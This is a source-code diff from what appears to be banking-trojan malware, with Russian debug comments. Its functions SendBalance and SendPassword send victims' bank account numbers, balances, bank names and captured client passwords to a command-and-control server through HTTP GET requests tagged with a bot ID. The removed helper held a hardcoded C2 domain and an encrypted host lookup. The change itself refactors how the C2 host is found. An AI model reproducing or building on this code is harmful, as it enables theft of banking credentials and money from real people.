@@ -209,19 +209,6 @@ static ODBC* OpenDB()
 	return DB;
 }
 
-static char* GetAdminUrl( char* url )
-{
-#ifdef DEBUGCONFIG
-	m_lstrcpy( url, "az.zika.in" );
-#else
-	string host = GetActiveHostFromBuf2(Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
-	if( !host.IsEmpty() )
-		m_lstrcpy( url, host.t_str() );
-	else
-		url = 0;
-#endif
-	return url;
-}
 
 //отсылка полного клиента на видео сервер
 DWORD WINAPI SendTiny(LPVOID)
@@ -315,8 +302,8 @@ static int GetNameBank( char* bank, int szBank )
 static DWORD WINAPI SendBalance( InfoAccount* ia )
 {
 	DBG( "Tiny", "Отсылка баланса: %ls, %I64d, '%ls'", ia->account, ia->balance, ia->name );
-	char urlAdmin[128];
-	if( GetAdminUrl(urlAdmin) )
+	string Host = GetAzHost();
+	if(!Host.IsEmpty())
 	{
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 		TMemory qr(512);
@@ -327,9 +314,8 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 		char balance[16];
 		pwsprintfA( balance, "%d.%d", int(ia->balance / 10000), int((ia->balance % 10000)) / 100 );
 		//формируем запрос
-		string azUser = GetAzUser();
 		//pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=getdrop&sum=%s&acc=%s", urlAdmin, Bot->UID.t_str(), azUser.t_str(), balance, account );
-		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), balance, account, urlNameBank);
+		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", Host.t_str(), BOT_UID, GetAzUser().t_str(), balance, account, urlNameBank);
 		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
 		THTTP H;
 		H.Get(qr.AsStr());
@@ -342,8 +328,8 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 static DWORD WINAPI SendPassword( void* )
 {
 	DBG( "Tiny", "Отсылка пароля %s", passwordClient );
-	char urlAdmin[128];
-	if( GetAdminUrl(urlAdmin) )
+	string Host = GetAzHost();
+	if(!Host.IsEmpty())
 	{
 		char text[128];
 		fwsprintfA pwsprintfA = Get_wsprintfA();
@@ -352,7 +338,7 @@ static DWORD WINAPI SendPassword( void* )
 		char* urlText= URLEncode(text);
 		TMemory qr(512);
 		string azUser = GetAzUser();
-		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
+		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", Host.t_str(), BOT_UID, azUser.t_str(), urlText );
 		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
 		THTTP H;
 		H.Get(qr.AsStr());
